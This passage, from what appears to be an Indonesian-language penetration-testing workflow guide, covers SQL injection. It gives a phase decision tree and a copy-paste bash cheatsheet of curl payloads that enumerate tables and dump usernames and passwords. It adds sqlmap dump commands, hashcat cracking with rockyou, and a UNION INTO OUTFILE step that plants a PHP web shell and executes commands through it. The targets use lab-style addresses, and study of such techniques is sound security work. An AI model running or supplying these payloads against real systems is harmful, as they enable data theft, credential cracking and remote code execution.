│   ├─ [SQL Error terlihat]      → FASE 3 (Error-Based) ATAU FASE 2 (UNION)
│   ├─ [TRUE/FALSE berbeda]      → FASE 4 (Boolean Blind)
│   ├─ [Delay terdeteksi]        → FASE 5 (Time-Based)
│   └─ [Tidak ada perbedaan]     → Coba context lain / parameter lain
│
├─ FASE 2: UNION SQLi
│   ├─ ORDER BY → temukan jumlah kolom
│   ├─ UNION SELECT NULL → konfirmasi
│   ├─ Find displayable columns
│   └─ Extract: DB → Tables → Columns → Data → CRACK HASH
│
├─ FASE 3: Error-Based
│   └─ MySQL: EXTRACTVALUE | MSSQL: CONVERT | PgSQL: CAST
│
├─ FASE 4: Boolean Blind
│   ├─ Manual: ASCII + SUBSTRING + Binary search
│   └─ Auto: Python script atau SQLMap --technique=B
│
├─ FASE 5: Time-Based
│   ├─ MySQL: SLEEP() | MSSQL: WAITFOR | PgSQL: pg_sleep()
│   └─ SQLMap --technique=T (lebih reliable)
│
├─ FASE 6: SQLMap Automation
│   └─ Setelah manual confirm → sqlmap untuk dump efisien
│
├─ FASE 7: Special Contexts
│   └─ Cookie / Header / JSON / XML injection
│
└─ FASE 8: Escalation
    ├─ [MySQL FILE priv] → INTO OUTFILE → Webshell → RCE → Privesc
    ├─ [MSSQL sysadmin] → xp_cmdshell → RCE → Privesc
    ├─ [PgSQL superuser] → COPY PROGRAM → RCE → Privesc
    └─ [Credentials]    → Credential reuse ke service lain
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"
export PARAM="id"
export TARGET_URL="http://$TARGET"
mkdir -p ~/sqli_loot/{dumps,hashes,shells,requests}

# === DETECTION ===
curl -s --get --data-urlencode "$PARAM=10'" "$TARGET_URL/item"          # Single quote
curl -s --get --data-urlencode "$PARAM=10 AND 1=1-- -" "$TARGET_URL/item" | wc -c  # TRUE
curl -s --get --data-urlencode "$PARAM=10 AND 1=2-- -" "$TARGET_URL/item" | wc -c  # FALSE
time curl -s -o /dev/null --get --data-urlencode "$PARAM=10 AND SLEEP(5)-- -" "$TARGET_URL/item"  # Time

# === UNION FLOW (MySQL, 3 columns) ===
curl -s --get --data-urlencode "$PARAM=10 ORDER BY 4-- -" "$TARGET_URL/item" | wc -c           # Column count
curl -s --get --data-urlencode "$PARAM=0 UNION SELECT 'A','B','C'-- -" "$TARGET_URL/item"      # Displayable cols
curl -s --get --data-urlencode "$PARAM=0 UNION SELECT @@version,database(),user()-- -" "$TARGET_URL/item"  # DB info
curl -s --get --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(table_name),'B','C' FROM information_schema.tables WHERE table_schema=database()-- -" "$TARGET_URL/item"  # Tables
curl -s --get --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(column_name),'B','C' FROM information_schema.columns WHERE table_name='users'-- -" "$TARGET_URL/item"     # Columns
curl -s --get --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(username,0x3a,password),'B','C' FROM users-- -" "$TARGET_URL/item"  # Dump!

# === SQLMAP ===
sqlmap -u "$TARGET_URL/item?$PARAM=10" -p $PARAM --batch                          # Detect
sqlmap -u "$TARGET_URL/item?$PARAM=10" -p $PARAM --batch --dbs                    # List DBs
sqlmap -u "$TARGET_URL/item?$PARAM=10" -p $PARAM --batch -D shopdb --tables       # List Tables
sqlmap -u "$TARGET_URL/item?$PARAM=10" -p $PARAM --batch -D shopdb -T users --dump # Dump!
sqlmap -r request.txt --batch --dbs                                                # Dari file request

# === HASH CRACKING ===
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force         # MD5
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt --force       # SHA1
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --force      # bcrypt

# === RCE (MySQL) ===
# Cek FILE priv:
curl -s --get --data-urlencode "$PARAM=0 UNION SELECT @@secure_file_priv,'B','C'-- -" "$TARGET_URL/item"
# Upload shell:
curl -s --get --data-urlencode "$PARAM=0 UNION SELECT '<?php system(\$_GET[\"c\"]); ?>','B','C' INTO OUTFILE '/var/www/html/sh.php'-- -" "$TARGET_URL/item"
# Execute:
curl -s "http://$TARGET/sh.php?c=id"
```

---

> **➡️ NEXT:** Setelah dapat kredensial dari SQL injection, langkah selanjutnya bergantung pada apa yang didapat:
> 
> - Password plaintext → **`<a href="/docs/authentication-bypass" class="text-[#00b4d8] hover:underline font-mono font-semibold">18_authentication_bypass_workflow.md</a>`** untuk bypass login
> - Hash → **`<a href="/docs/password-cracking" class="text-[#00b4d8] hover:underline font-mono font-semibold">63_password_cracking_workflow.md</a>`** untuk cracking
> - Akses SSH → **`<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>`**
> - Akses web admin → **`<a href="/docs/wordpress" class="text-[#00b4d8] hover:underline font-mono font-semibold">17a_wordpress_workflow.md</a>`** atau file lain sesuai CMS
> - Shell dari RCE → **`<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`** atau **`[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)`**